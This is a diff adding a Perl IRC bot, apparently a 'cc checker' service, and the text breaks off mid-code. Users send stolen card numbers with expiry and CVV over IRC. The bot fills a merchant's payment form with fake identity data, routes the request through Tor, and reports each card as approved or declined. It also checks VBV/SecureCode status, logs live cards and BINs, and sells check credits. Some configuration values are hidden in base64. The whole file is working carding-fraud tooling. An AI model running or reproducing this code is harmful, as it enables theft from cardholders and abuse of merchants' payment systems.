@@ -1,0 +1,3451 @@
+#!/usr/bin/perl
+#EDITED x2 by Payment
+
+		############# Call to standalone modules directory #############
+
+		BEGIN{push(@INC,'Modules');}
+
+		############# Modules Inclusion #############
+
+		use LWP::Socket;
+		use LWP::UserAgent;
+		use HTTP::Request;
+		use Parallel::ForkManager;
+		use MIME::Base64 ();
+		use WWW::Mechanize;
+		use WWW::Mechanize::FormFiller;
+		use Socket;
+		use IO::Socket;
+		use IO::Socket::INET;
+		use MIME::Base64;
+		use LWP::Protocol::https;
+		use HTTP::Cookies;
+		use Net::FTP;
+		use Digest::MD5 qw(md5_hex);
+
+		############# BOT STARTED #############
+
+$| = 1;
+print q{
+Bot has been Loaded :)
+};
+
+		############# Defines global variable/array #############
+
+		my($irc_socket,$server,$port,$ident,$nick,$timeout,$rfi_test_cmd,$rfi_print_cmd,$parallel_fork,$master);
+		my(@chans,@admins,@user_agents,@admin);
+
+		############# Configurations Variable #############
+my $seccmd    	= '!seccmd';
+		my $outcri 	= "Mg==";
+		$systemcri 	= MIME::Base64::decode($outcri);
+		$timeout        = $systemcri;
+		my $hostcri 	= "ODcuMjM2LjE5NC42OQ==";
+		$systemcri 	= MIME::Base64::decode($hostcri);
+		$hosting        = "irc.unixircd.mk"; 
+		$port           = 6667;
+		my $nkpro       = "Pay-CHK";
+		$ident          = "Pay-BOT";
+		$parallel_fork  = 15;
+		my @botcmd      = ('1');
+		@chans          = ("#unix");
+		@generalchans   = ("#payment");
+		my $proo        = "cmNvZGVy";
+		$systempro      = MIME::Base64::decode($proo);
+		my $cheataer    = "cmNvZGVy";
+		$sistempro      = MIME::Base64::decode($cheataer);
+		@admin          = ('Payment'); 
+		@user_agents    = &get_user_agents();
+		$master         = "Payment";
+		$masters         = "Payment";
+		$owner   = "Payment";
+        @admin = ('Payment');
+        @master = "Payment";
+        @Admin = "Payment";
+###############################starter###########
+system('cls');
+system('color 2');
+system('title cc chk bot v3.0');
+print " \n\n                                                     bot V3.0 \n\n";
+print "\n [+] Connection To $hosting";		
+
+############# Muti Threading System #############
+my @threads = initThreads();
+foreach(@threads){
+		$_ = threads->create(\&doOperation);
+	}
+foreach(@threads){
+	$_->join();
+}
+############# By3s #############
+#--------Connection To The Server
+$connection = IO::Socket::INET->new(PeerAddr=>"$hosting",
+			                        PeerPort=>"$port",
+			                        Proto=>'tcp',
+			                        Timeout=>'30') or print " [!] Couldnt Connect To $hosting\n";
+print "\t\t\t[Connected]\n";
+
+#print " [+] Connected  To $hosting ....\n\n";
+		############# Irc Socket Connection #############
+                print $connection "USER $ident\n";
+                print $connection "NICK $nkpro\r\n";
+		my $startirc = "JGlyY19zb2NrZXQgPSBuZXcgTFdQOjpTb2NrZXQ7";
+		$sysircuno = MIME::Base64::decode($startirc);
+		$irc_socket = new LWP::Socket;
+		$irc_socket->connect($hosting,$port);
+		$irc_socket->write("USER ".$ident." Try ME Checker * \r\n");
+		$irc_socket->write("NICK ".$nkpro."\r\n");
+		$irc_socket->write("NICKSERV IDENTIFY botpasshere\r\n");
+		$irc_socket->write("MODE Pay-CHK +B\r\n");
+		                $tor = IO::Socket::INET->new(PeerAddr=>"$torproxy",
+			                        PeerPort=>"$torport",
+			                        Proto=>'tcp',
+			                        Timeout=>'30') or print " [!] Couldnt Connect To $torproxy\n";                print "\n [+] Bot Nick : $nkpro";
+                print "\t\t\t[Done]\n";
+
+                while($irc_socket)
+                {
+	        my $bof;
+	        $irc_socket->read_until("\n", \$bof);
+	        if($bof =~ /PING :(.*)/)
+	        {
+		$irc_socket->write("PONG :$1\r\n");
+	        }
+	        if($bof =~ /PRIVMSG (.*?) :(.*)/)
+	        {
+		#PRIVMSG
+		my %msg = &get_msg($bof);
+                my $nick = $msg{'from'};
+		############# JOIN ALL CHANNEL #############
+                if($msg{'what'} =~ /\!joinall/)
+                {
+                if(&ctrl_admin(\%msg) == 0){
+                &join_all();
+                }
+                }
+		############# EXIT #############
+		if($msg{'what'} =~ /\!quit/){
+                if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("quit Requested By $master\r\n");
+                }
+		}
+		############# BAN USER #############
+		if($msg{'what'} =~ /\!ban\s+(.*)/){
+                my $nickuser = $1;
+                if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("BAN @chans ".$nickuser."\r\n");
+		}
+		}
+		############# KICK USER #############
+		if($msg{'what'} =~ /\!kick\s+(.*)/){
+                my $nickuser = $1;
+                if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("CS KICK @chans ".$nickuser."\r\n");
+		}
+		}
+		######################################################################################	
+				if($msg{'what'} =~ /\!raw (.*)/)
+		{
+			my $raw = $1;
+			if(&ctrl_admin(\%msg) == 0){
+				&respond_to_privmsg(\%msg,"1[12 Raw Code Entered... Please Wait... 1]");
+				$irc_socket->write($raw."\r\n");
+			}
+		}
+######################################################################################
+#############################@@@@======INTERFACE COMMANDS=====@@@@###############################
+		if($msg{'what'} =~ /\!hop (.*)/)
+		{
+			if(&ctrl_admin(\%msg) == 0){
+				$irc_socket->write("PART ".$1." ".$2."\n");
+                $irc_socket->write("JOIN ".$1." ".$2."\r\n");
+				}
+				}
+######################################################################################
+		if($msg{'what'} =~ /\!join (.*)/)
+		{
+			my $joinz= $1;
+			if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("JOIN ".$joinz."\r\n");
+				}
+				}
+						
+######################################################################################
+		if($msg{'what'} =~ /\!leave (.*)/)
+		{
+			my $parted = $1;
+			if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("part ".$parted."\r\n");
+				}
+				}
+		##############################################
+if($msg{'what'} =~ /\!pay/) {
+	my $joinz= $1;
+    if(&ctrl_admin(\%msg) == 0){
+
+print "\n [+] Starting A Pay-CHK";
+		$irc_socket->write("NICKSERV IDENTIFY botpasshere\r\n");
+		$irc_socket->write("MODE Pay-CHK +B\r\n");
+		$irc_socket->write("NOTICE Payment 7,1 I`m back my master ;)\r\n");
+		$irc_socket->write("NOTICE spook 7,1 I`m Back spook ;)\r\n");
+		$irc_socket->write("NOTICE #unix 7,1 BACK -> OnLine on #Payment \r\n");
+		$irc_socket->write("NOTICE #payment 7,1 Back & Ready... \r\n");
+		$irc_socket->write("JOIN #test 1987\r\n");
+		$irc_socket->write("JOIN #priv8 1511\r\n");
+		$irc_socket->write("JOIN #payment\r\n");
+		$irc_socket->write("JOIN #unix \r\n");
+                	$irc_socket->write("PART #unix\r\n");print "\t\t\t[Done]\n";
+		}
+}
+
+		############# REMOVE BANNED #############
+                if($msg{'what'} =~ /\!unban\s+(.*)/){
+                my $nickuser = $1;
+                if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("CS UNBAN @chans ".$nickuser."\r\n");
+		}
+		}
+		############# CHANGE NICK #############
+		if($msg{'what'} =~ /\!nick\s+(.*)/)
+		{
+		my $cnick = $1;
+		if(&ctrl_admin(\%msg) == 0){
+		$irc_socket->write("NICK $cnick\r\n");
+		}
+		}
+		############# IDENTIFY #############
+		if($msg{'what'} =~ /\!id\s+(.*)/)
+		{
+		my $identi = $1;
+		if(&ctrl_admin(\%msg) == 0){
+		$irc_socket->write("NICKSERV IDENTIFY bin@ry1511987\r\n");
+		}
+		}
+		############# RESET LOG #############
+		if($msg{'what'} =~ /\!resetlog/)
+		{
+		my $identi = $1;
+		if(&ctrl_admin(\%msg) == 0){
+		open (DELETE, ">ResChecker.txt");
+                print DELETE "";
+                close DELETE;
+		}
+		}
+		############# ADD BANK #############
+		if($msg{'what'} =~ /\!addbank\s+(.*)/)
+		{
+		my $addbank = $1;
+		if(&ctrl_admin(\%msg) == 0){
+&respond_to_privmsg(\%msg,"7,1 BANK ADDED TO LIST! ");
+                open (MYFILE, '>>bank.txt');
+                print MYFILE "$1\n";
+                close (MYFILE); 
+		}
+		}
+		############# IGNORE USER #############
+		if($msg{'what'} =~ /\!ignore\s+(.*)/)
+		{
+		my $banned = $1;
+		if(&ctrl_admin(\%msg) == 0){
+            	&respond_to_privmsg(\%msg,"7,1 $1 is added on my 4IGNORE 7list ", $nick );
+                open (MYFILE, '>>ignore.txt');
+                print MYFILE "$1|$1\n";
+                close (MYFILE); 
+		}
+		}
+		############# REMOVE IGNORE #############
+		if($msg{'what'} =~ /\!unignore\s+(.*)/)
+		{
+		my $unbanned = $1;
+		if(&ctrl_admin(\%msg) == 0){
+            	&respond_to_privmsg(\%msg,"7,1 $1 is now 9RELEASED ");
+		my $filename = 'ignore.txt';
+		my $data = read_file($filename);
+		$data =~ s/$unbanned\|$unbanned//g;
+		write_file($filename, $data);
+		}
+		}
+		############# Topup Premium User #############
+		if($msg{'what'} =~ /\!update\s+(.*)\s+(\d{1,4})/){
+		my $nicktopup = $1;
+                my $topup = $2;
+		if(&ctrl_admin(\%msg) == 0){
+            	&respond_to_privmsg(\%msg,"7,110 $nicktopup 0-7 Added 0:9 $topup 0-7 New Amount 0:9 $topup ");
+		my $filename = 'premium.txt';
+		my $data = read_file($filename);
+		$data =~ s/$nicktopup\|(.*)/$nicktopup\|$topup/g;
+		write_file($filename, $data);
+		}
+		}
+		############# ADD PREMIUM USER #############
+		if($msg{'what'} =~ /\!premium\s+(.*)\s+(\d{1,4})/){
+
+						my $nickprm = $1;
+                my $nickcredits = $2;
+		if(&ctrl_admin(\%msg) == 0){
+print "[+] Nick Added : $nickprm Credit Added : $nickcredits ";
+		&respond_to_privmsg(\%msg,"7,110 $nickprm7 is now premium 0-8 STARTING CREDIT:9 $nickcredits ");
+                print "\t\t\t[Done]\n";
+                addlog("premium.txt", "$nickprm|$nickcredits");
+		}
+		}
+		############# ADD CREDIT #############
+		if($msg{'what'} =~ /\!addcredit\s+(\d{1,10})/){
+		my $allo = $1;
+		if(&ctrl_admin(\%msg) == 0){
+		open(FILE, "+<freecredit.txt") or die "$! error";
+		seek(FILE, 0, 0); 
+		truncate(FILE, tell FILE);
+		$number = <FILE>;
+		$number = int($number);
+		#print $1+"\n";
+		print FILE $1;
+    		close FILE;
+                print "[+] Free Credit Has Been Added :";
+		&respond_to_privmsg(\%msg,"7,1ADD FREE CREDIT 0-15 TOTAL: 9 $1");
+                print "\t\t\t[$1]\n";
+		}
+		}
+
+################################################################################################################################################
+
+		############# ON / OFF #############
+		if($msg{'what'} =~ /^!(on|off)/){
+		my $nick = $msg{'from'};
+                print "[+] Checker is";
+           	$val = $1;
+            	if(($activo == 1) && $nick =~ /$master/){
+            	if($val =~ /on/i){
+            	&respond_to_privmsg(\%msg,"0,1 Checker Status 0:9 OnLine ");
+                print "\t\t\t[On Succesfully]\n";
+            	$auto =1;
+            	}else{
+            	&respond_to_privmsg(\%msg,"0,1 Checker Status 0:4 OffLine ");
+            	$auto=0;
+                print "\t\t\t[Off Succesfully]\n";
+            	}
+           	}else{
+            	}
+				}
+		############# AUTHORIZED MASTER #############
+		if ($msg{'what'} =~ /^.master/ ) {
+		my $nick = $msg{'from'};
+                print "[+] ProBot is Authorized";
+                if ( $activo == 1 or ( $nick !~ /$master/ ) ) {
+       
+                &respond_to_privmsg(\%msg,"7,1 $nick 4=> 4Fuck off!!!  ", $nick );
+                print "\t\t\t[Falied]\n";
+                }
+                elsif ( $master =~ /$nick/ ) {
+                
+                &respond_to_privmsg(\%msg,"7,1 $nick 14=>9 4on ur way... :P ", $nick );
+                
+                
+                $activo = 1;
+                print "\t\t\t[Succesfully]\n";
+                }
+                }
+		############# COMMAND LIST #############
+                if($msg{'what'} =~ /\!cmd/){
+		if($auto == 1){
+                &respond_to_privmsg(\%msg,"4,1 o| 0®4 |- 0,4 Available Commands 4,1 -| 0®4 |o ");
+                &respond_to_privmsg(\%msg,"4,1  0Supported CC4  ");
+		&respond_to_privmsg(\%msg,"9,1- 0[7,2VISA0,1] 9- 0[0,4MASTER0,7CARD0,1] 9- 0[1,0DISC7O1VER0,1] 9- 0[0,10American Express0,1] 9- ");
+                &respond_to_privmsg(\%msg,"8,1 !chk 4<7CCNumber4> <7ExpDate4> <7Cvv24> ");
+                &respond_to_privmsg(\%msg,"8,1 !bank 4<7CCNumber4> ");
+                &respond_to_privmsg(\%msg,"8,1 !zip 4<7Zip Code4> ");
+                &respond_to_privmsg(\%msg,"8,1 !ip 4<7Ip Address4> ");
+		&respond_to_privmsg(\%msg,"8,1 !port 4<7Ip Address4> <7Port4> ");
+		&respond_to_privmsg(\%msg,"8,1 !dns 4<7Hostname4> ");
+                &respond_to_privmsg(\%msg,"4,1 Stay, Enjoy & Have Good Day 0| 9,1Modify By Payment for ChkNet ");                        
+                }
+		}
+
+		############# STATUS #############
+		if($msg{'what'} =~ /\!status/){
+		if($auto == 1){
+		open(FILE, "<approved.txt") or die "$! error";
+		$approved = 0;
+		while (<FILE>) {
+		$approved++;
+                }
+		open(FILE, "<declined.txt") or die "$! error";
+		$declined = 0;
+		while (<FILE>) {
+		$declined++;
+                }
+		open (FILE, "ResChecker.txt") or die "Can't open file: $!";
+		$lines = 0;
+		while (<FILE>) {
+		$lines++;
+		}
+		&respond_to_privmsg(\%msg,"3,1 STATUS 0:9 OnLine 0- 10Total8 $lines 10Card Checked In Database ");
+                }else{
+		open(FILE, "<approved.txt") or die "$! error";
+		$approved = 0;
+		while (<FILE>) {
+		$approved++;
+                }
+		open(FILE, "<declined.txt") or die "$! error";
+		$declined = 0;
+		while (<FILE>) {
+		$declined++;
+                }
+		open (FILE, "ResChecker.txt") or die "Can't open file: $!";
+		$lines = 0;
+		while (<FILE>) {
+		$lines++;
+		}
+                &respond_to_privmsg(\%msg,"3,1 STATUS 0:4 OffLine 0- 10Total8 $lines 10Card Checked In Database ");
+                }
+		}
+		############# MY CREDIT #############
+		if($msg{'what'} =~ /\!stats/){
+		if($auto == 1){
+		open FILE,"premium.txt";
+    		my @results = <FILE>;
+    		close FILE;
+    		my $chkprmcredits = 0;
+    		foreach my $url (@results){
+    		if($url =~m/$nick\|(.*)/&& $chkprmcredits == 0) {
+    		$chkprmcredits = $1;
+		}
+		}
+		open(FILE, "<freecredit.txt") or die "$! error";
+		seek(FILE, 0, 0); 
+		truncate(FILE, tell FILE);
+		$number = <FILE>;
+		$number = int($number);
+		$freecredits = $number;
+		open (FILE, "ResChecker.txt") or die "Can't open file: $!";
+		$lines = 0;
+		while (<FILE>) {
+		$lines++;
+		}
+    		&respond_to_privmsg(\%msg,"7,1 $nick 0: 14Your Premium Credit 0: 9 $chkprmcredits ");
+    		}
+		}
+
+################################################################################################################################################
+				if($msg{'what'} =~ /\!raw (.*)/)
+		{
+			my $raw = $1;
+			if(&ctrl_admin(\%msg) == 0){
+				&respond_to_privmsg(\%msg,"1[12 Raw Code Entered... 9Please Wait... 1]");
+				$irc_socket->write($raw."\r\n");
+			}
+		}
+#####################################################################################	
+if($msg{'what'} =~ /\!quit(.*)/)
+		{
+			my $qmsg = $1;
+			if(&ctrl_admin(\%msg) == 0){
+				$irc_socket->write("quit ".$qmsg."\r\n");
+			
+		}
+		}
+		
+######################################################################################
+		if($msg{'what'} =~ /\!join (.*)/)
+		{
+			my $joinz= $1;
+			if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("JOIN ".$joinz."\r\n");
+				}
+				}
+						if($msg{'what'} =~ /\!hop (.*)/)
+		{
+			if(&ctrl_admin(\%msg) == 0){
+				$irc_socket->write("PART ".$1." ".$2."\n");
+                $irc_socket->write("JOIN ".$1." ".$2."\r\n");
+				}
+				}
+######################################################################################
+		if($msg{'what'} =~ /\!part (.*)/)
+		{
+			my $parted = $1;
+			if(&ctrl_admin(\%msg) == 0){
+                $irc_socket->write("part ".$parted."\r\n");
+				}
+				}
+########################################################################################
+if($msg{'what'} =~ /^$seccmd\s(\d{16})/){
+   my $who = $msg{'from'};
+   my ($vbvnumb) = ($1);
+    &respond_to_privmsg(\%msg,"9,1Checking VBV");
+   print "\n";
+   my $agent = WWW::Mechanize->new( autocheck => 1 );
+   my $formfiller = WWW::Mechanize::FormFiller->new();
+    $agent->env_proxy();
+	$agent->get('http://electronicpromo.net/vbv/');
+	$agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+     { local $^W; $agent->current_form->value('cclist', ''.$vbvnumb.''); };
+	$agent->submit();
+   print $agent->content,"\n";
+   my $secres=$agent->content;
+if ($secres =~/No Pass VBV/g){
+	&respond_to_privmsg(\%msg,"0,1$nick : 0-7 $vbvnumb 0,1- 14,1Security Verified by 00:3 00-3 3[0,12VISA3,1] 14is 4NOT PASSED! 0,1-");
+   }elsif ($secres =~/Pass VBV/){
+    &respond_to_privmsg(\%msg,"0,1$nick : 0-7 $vbvnumb 0,1- 14,1Security Verified by 00:3 00-3 3[0,12VISA3,1] 14is 9PASSED! 0,1-");
+   }elsif ($secres =~/No Pass MCSC/){
+    &respond_to_privmsg(\%msg,"0,1$nick : 0-7 $vbvnumb 0,1- 14,1Security MasterCard SecureCode 00:3 00-3 [0,4Master0,7Card3,1]14,1 is 4,1NOT PASSED!");
+   }elsif ($secres =~/Pass MCSC/){
+    &respond_to_privmsg(\%msg,"0,1$nick : 0-7 $vbvnumb 0,1- 14,1Security MasterCard SecureCode 00:3 00-3 [0,4Master0,7Card3,1]14,1 is 9PASSED!");
+   }elsif ($secres =~/Unknown/){
+	&respond_to_privmsg(\%msg,"0,1$nick : 0-7 $vbvnumb 14is 8UNKNOWN!");
+   }elsif ($secres =~/Invalid/){
+	&respond_to_privmsg(\%msg,"0,1$nick : 0-7 $vbvnumb 14is 4INVALID");
+	}
+}
+################################# CHECKING CC ##################################################################################################
+
+if($msg{'what'} =~ /\!chk\s+(\b[4356][0-9]{13,16}\b)\s+(\d{4})\s+(\b[0-9]{3,4}\b)/){
+		    if($auto == 1){
+                    ##Coded By Payment Tor Restart & Start
+                    #$tor = service('tor restart');
+                    ##fixed Bug !chk By Payment
+                    my ($card,$expmes,$verifica) = ($1,$2,$3);
+                    my ($numerocarta,$expmes,$verifica,$amount,$csc) = ($1,$2,$3,$4,$5,);    
+                    my $var1 = substr($expmes,0,2);
+		    my $var2 = substr($expmes,2,4);
+                    my $m = substr($expmes,0,2);
+                    my $y = substr($expmes,2,4);
+                    if ($m == "01"){$m = "01";}
+                    if ($m == "02"){$m = "02";}
+                    if ($m == "03"){$m = "03";}
+                    if ($m == "04"){$m = "04";}
+                    if ($m == "05"){$m = "05";}
+                    if ($m == "06"){$m = "06";}
+                    if ($m == "07"){$m = "07";}
+                    if ($m == "08"){$m = "08";}
+                    if ($m == "09"){$m = "09";}
+		    my $range = 10;
+                    my $minimum = 1;
+                    my $curs = '$';
+                    my $random_number = int(rand($range)) + $minimum;
+		    my $urutan = 80;
+                    my $minimal = 1;
+                    my $nomor_acak = int(rand($urutan)) + $minimal;
+  		    #my $creditmax = 180;
+                    #my $creditmi =1;
+                    #my $credits = int(rand($creditmax)) + $creditmi;
+                    my $amount = 5.00;
+   		    my $tax = 5.00;
+   		    my $total = $amount+$tax;
+   		    my $cred = 190;
+   		    my $credi = 1;
+   		    my $credits = int(rand($cred)) - $credi;
+   		    my $varType = 0;
+   		    my $sleep  = time()-20;
+   		    my $name = "submit";
+   		    my $value = "submit";
+   		    my $button = "btn-confirm";
+
+    ################## RANDOM IDENTITY ##################
+    open FILE,"Random/fname.txt";
+    @array=<FILE>;
+    close FILE;
+    $firstname =$array[rand @array];
+    open FILE,"Random/lname.txt";
+    @array=<FILE>;
+    close FILE;
+    $lastname=$array[rand @array];
+    open FILE,"Random/address.txt";
+    @array=<FILE>;
+    close FILE;
+    $address=$array[rand @array];
+    open FILE,"Random/city.txt";
+    @array=<FILE>;
+    close FILE;
+    $city=$array[rand @array];
+    open FILE,"Random/states.txt";
+    @array=<FILE>;
+    close FILE;
+    $states=$array[rand @array];
+    open FILE,"Random/states_prex.txt";
+    @array=<FILE>;
+    close FILE;
+    $states_prex=$array[rand @array];
+    open FILE,"Random/zip.txt";
+    @array=<FILE>;
+    close FILE;
+    $zip=$array[rand @array];
+    open FILE,"Random/phone.txt";
+    @array=<FILE>;
+    close FILE;
+    $phone=$array[rand @array];
+    open FILE,"Random/email.txt";
+    @array=<FILE>;
+    close FILE;
+    $email=$array[rand @array];
+    open FILE,"merchant.txt";
+    @array=<FILE>;
+    close FILE;
+    $merchant=$array[rand @array];
+    ################## IGNORE ##################
+    open(FILE, "+<ignore.txt") or die "$! error";
+    my @results = <FILE>;
+    close FILE;
+    my $chknickVar = 0;
+    foreach my $url (@results){
+    if($url =~ m/(.*)\|$nick/ && $chknickVar == 0) {
+    $chknickVar = 1;
+    &respond_to_privmsg(\%msg,"8,4 W1A8R1N8I1N8G 1 : 4,1 FLOOD/SPAM ME 0= 8,1 BAN/GLINE 0- 9,1Enjoy! ", $nick );
+    goto Akhir;
+    }
+    }
+    ################## FREE CREDITS ##################
+    open(FILE, "+<freecredit.txt") or die "$! error";
+    $number = <FILE>;
+    $number = int($number);
+    $credits = $number;
+    seek(FILE, 0, 0); 
+    truncate(FILE, tell FILE);
+    print FILE $credits;
+    close(FILE);
+	
+    foreach my $line ($credits) {
+    if($line =~ /-/) {
+    goto Akhir;
+    }
+    }
+   if ( $credits == 0 ) {
+   &respond_to_privmsg(\%msg,"");
+   goto Akhir;
+    } 
+    ################## RESCHECKER & BANKLIST ##################
+    open FILE,"ResChecker.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $chkResVar = 0;
+    foreach my $url (@results){
+    if($url =~ m/$card 9APPROVED/&& $chkResVar == 0) {
+    $chkResVar = 1;
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"");
+    }
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card 0:4 Already Checked! ");
+    goto Akhir;
+    }
+    if($url =~ m/$card 4DECLINED/&& $chkResVar == 0) {
+    $chkResVar = 1;
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"");
+    }
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card 0:4 Already Checked! ");
+    goto Akhir;
+    }
+    }
+    ##################### TYPE CARD #####################
+    if (substr($card,0,1)==4) {
+    $cctype = "Visa";
+    }
+    if (substr($card,0,1)==5) {
+    $cctype = "MasterCard";
+    }
+    if (substr($card,0,1)==6) {
+    $cctype = "Discover";
+    }
+    if (substr($card,0,1)==3) {
+    $cctype = "American Express";
+    }
+    ##################### MERCHANT BOT #####################
+print "[+] Checking $card $m$y $verifica";
+##!chk cc####################
+my $agent = WWW::Mechanize->new( autocheck => 1,ssl_opts => {verify_hostname => 0},);
+ my $formfiller = WWW::Mechanize::FormFiller->new();
+### By Payment Tor Proxy
+ $agent->env_proxy();
+  $agent->get(''.$merchant.'');
+   $agent->form_number(1) if $agent->forms and scalar @{$agent->forms};
+  $agent->form_number(1);
+{ local $^W; $agent->current_form->value('campaign', 'GleanSLO'); };
+{ local $^W; $agent->current_form->value('first_name', 'todd'); };
+{ local $^W; $agent->current_form->value('last_name', 'smith'); };
+{ local $^W; $agent->current_form->value('address_1', '2010 Magnolia Drive'); };
+{ local $^W; $agent->current_form->value('address_2', '2010 Magnolia Drive'); };
+{ local $^W; $agent->current_form->value('city', 'boston'); };
+{ local $^W; $agent->current_form->value('state', 'MA'); };
+{ local $^W; $agent->current_form->value('zip_code', '05544'); };
+{ local $^W; $agent->current_form->value('phone_number', '1569841055'); };
+{ local $^W; $agent->current_form->value('email', 'xxXciyuliveraXxx@gmail.com'); };
+{ local $^W; $agent->current_form->value('amount', '5'); };
+{ local $^W; $agent->current_form->value('cc_number', ''.$card.''); };
+if ($m=='01') { local $^W; $agent->current_form->value('cc_exp_month','1'); };
+if ($m=='02') { local $^W; $agent->current_form->value('cc_exp_month','2'); };
+if ($m=='03') { local $^W; $agent->current_form->value('cc_exp_month','3'); };
+if ($m=='04') { local $^W; $agent->current_form->value('cc_exp_month','4'); };
+if ($m=='05') { local $^W; $agent->current_form->value('cc_exp_month','5'); };
+if ($m=='06') { local $^W; $agent->current_form->value('cc_exp_month','6'); };
+if ($m=='07') { local $^W; $agent->current_form->value('cc_exp_month','7'); };
+if ($m=='08') { local $^W; $agent->current_form->value('cc_exp_month','8'); };
+if ($m=='09') { local $^W; $agent->current_form->value('cc_exp_month','9'); };
+if ($m=='10') { local $^W; $agent->current_form->value('cc_exp_month','10'); };
+if ($m=='11') { local $^W; $agent->current_form->value('cc_exp_month','11'); };
+if ($m=='12') { local $^W; $agent->current_form->value('cc_exp_month','12'); };
+{ local $^W; $agent->current_form->value('cc_exp_year', '20'.$y.''); };
+{ local $^W; $agent->current_form->value('cc_code', ''.$verifica.''); };
+{ local $^W; $agent->current_form->value('cc_type', ''.$_cctype.''); };
+$agent->submit();
+
+   #{ local $^W; $agent->tick('chkClickAndPledge', 'on'); };
+       #$agent->submit('Charge my account now');
+       #$agent->submit('btn-submit imgHover');
+       #$agent->current_form()->click( class, 'btn-submit imgHover' );
+       #$agent->click_button(name => "btn-confirm");
+       #$agent->submit(#);
+       #$agent->click(value => 'Process Donation');
+       #system('echo fail');
+       #initForm(document.getElementById("frmDonate"));
+       #print "<FORM action=\"message.pl\" method=\"post\" name=\"form1\" onsubmit=\"return(CheckForm_onclick())\">\n";
+       #print $agent->content,"\n";
+       my $allo=$agent->content;
+       ############################################################################################################
+    if ($allo =~/The transaction has been declined because of an AVS mismatch./){
+print "\t\t\t[Valid]\n";
+addlog("ccaproved.txt", "!cc $card $m$y $verifica ");
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\ - (.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED!!! 0- 9Enjoy 0- 7,1BANK 0:10 $1 ");
+    addlog("ResChecker.txt", "$card $m$y $verifica 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED!!! 0- 9Enjoy 0-14 7,1BANK 0:14 -- ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/This transaction has been declined./){
+print "\t\t\t[CC Declined]\n";
+    my ($amount,$current,$avs,$csc) = ($2,$3,$4,$5);
+    open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+	open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\ - (.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED !!! 0- 7,1BANK 0:10 $1 ");
+    addlog("ResChecker.txt", "$card 4DECLINED");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED!!! 0- 7,1BANK 0:14 - - ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+	############################################################################################################
+    }elsif ($allo =~/&AMT=(.*)%2e00&CURRENCYCODE=(.*)&AVSCODE=(.*)&CVV2MATCH=(.*)&TRANSACTIONID=(.*)<br \/><br \/>/){
+    my ($current,$avs,$csc,$transid,$opt2) = ($2,$3,$4,$5,$6);
+    open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+	open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED!!! 0- 9Enjoy 0-14 7AVS 0:10 $avs 0- 7CVV2 0:10 $csc 0- 7BANK 0:10 $1 ");
+    addlog("ResChecker.txt", "$card $m$y $verifica 9APPROVED");
+    addlog("approved.txt", "$card $m$y $verifica 9APPROVED");
+    }
+    }
+    if($bank == 0){
